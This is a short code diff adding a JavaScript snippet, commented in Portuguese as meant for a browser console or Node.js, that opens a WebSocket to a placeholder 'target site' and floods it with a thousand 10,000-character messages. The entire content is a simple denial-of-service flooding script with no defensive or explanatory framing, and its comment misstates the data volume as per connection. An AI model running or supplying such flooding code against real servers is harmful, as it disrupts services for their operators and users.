@@ -1,0 +1,6 @@
+// Código para rodar no navegador console ou Node.js
+const socket = new WebSocket("ws://site-alvo.com/ws");
+
+for (let i = 0; i < 1000; i++) {
+    socket.send("A".repeat(10000)); // 10MB por conexão
+}
